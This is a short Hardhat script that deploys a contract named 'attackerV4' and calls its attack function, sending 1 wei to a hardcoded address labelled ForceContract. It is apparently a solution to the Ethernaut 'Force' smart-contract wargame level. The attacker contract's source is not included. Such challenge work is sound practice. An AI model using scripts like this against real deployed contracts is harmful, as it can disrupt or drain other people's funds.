const { ethers } = require("hardhat");


const ATTACKER_NAME = "attackerV4";
const ForceContract="0x0CAD98BD4BeB4Cee3eC91957E68A2aafbAe778C4"


async function main() {

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy();
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);

  const tx =  await attackerContract.attack(ForceContract, {value: 1});
  await tx.wait();

  console.log("Tx success!");

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});